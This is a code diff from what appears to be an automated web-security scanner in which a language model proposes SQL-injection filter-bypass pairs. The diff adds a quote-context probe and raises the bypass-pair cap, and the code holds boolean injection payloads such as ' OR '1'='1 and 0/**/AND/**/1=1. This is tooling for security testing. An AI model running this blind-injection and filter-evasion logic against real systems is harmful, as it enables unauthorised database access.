@@ -567,8 +567,9 @@ const SQLI_NUM_FALSE = "0/**/AND/**/1=1";
 // act on.
 const NO_ROW_VALUE = "999999999";
 // Cap on model-proposed bypass pairs tried per filtered field — bounds cost and
-// keeps the confirmation a tight differential.
-const MAX_BYPASS_PAIRS = 6;
+// keeps the confirmation a tight differential. Headroom for the model to cover a
+// few injection contexts (numeric / quoted / parenthesized) in one reply.
+const MAX_BYPASS_PAIRS = 8;
 
 /** Escape a value for an XML text node, so a SOAP envelope stays well-formed. */
 function xmlEscape(value: string): string {
@@ -991,6 +992,24 @@ async function modelBypassConfirm(
   const noRowTokens = contentTokens(falseSent.res.body);
   const fingerprint = [...contentTokens(refSent.res.body)].filter((t) => !noRowTokens.has(t));
   if (fingerprint.length === 0) return undefined; // no observable oracle → never escalate
+  const reproducesRow = (body: string) => {
+    const toks = contentTokens(body);
+    return fingerprint.every((t) => toks.has(t));
+  };
+
+  // Context probe: append a single quote to the row-returning value. If the row
+  // disappears, the value sits inside a quoted string literal (`'…'`, possibly
+  // parenthesized) and a bypass must close the quote; if the row is unchanged the
+  // value is a bare numeric term. This one cheap request steers the model toward
+  // the right injection context instead of guessing.
+  const quoteSent = await rawSend(
+    session,
+    injectionRequest(opts, field, `${naturalValue(opts, field)}'`).req,
+  );
+  const quoteSignificant = quoteSent.kind === "ok" && !reproducesRow(quoteSent.res.body);
+  const contextNote = quoteSignificant
+    ? "A single quote appended to the value removed the row, so the quote is syntactically significant and the value reaches the query unsanitized — cover quoted ('…') and parenthesized ('…') string contexts as well as bare numeric."
+    : "A single quote appended to the value did not change the result — prefer a bare numeric context, but still include quoted variants as a fallback.";
 
   const brief: FilterBrief = {
     field,
@@ -999,6 +1018,7 @@ async function modelBypassConfirm(
     observations: [
       "A fixed boolean probe (' OR '1'='1 / 0 OR 1=1) returned the no-row page — an input filter likely strips or rewrites the payload.",
       "A quote probe ('\") raised no database error, so errors are suppressed (blind) and only a true/false response differential is observable.",
+      contextNote,
     ],
   };
   let pairs: Array<{ t: string; f: string }>;
@@ -1017,9 +1037,8 @@ async function modelBypassConfirm(
     const tSent = await rawSend(session, tReq.req, tReq.label);
     const fSent = await rawSend(session, injectionRequest(opts, field, f).req);
     if (tSent.kind !== "ok" || fSent.kind !== "ok") continue;
-    const tTokens = contentTokens(tSent.res.body);
     const fTokens = contentTokens(fSent.res.body);
-    const trueReproducesRow = fingerprint.every((tok) => tTokens.has(tok));
+    const trueReproducesRow = reproducesRow(tSent.res.body);
     const falseSuppressesRow = !fingerprint.some((tok) => fTokens.has(tok));
     if (trueReproducesRow && falseSuppressesRow) {
       bus.emit("exploit.adapt", { field, candidates: pairs.length, confirmed: true });
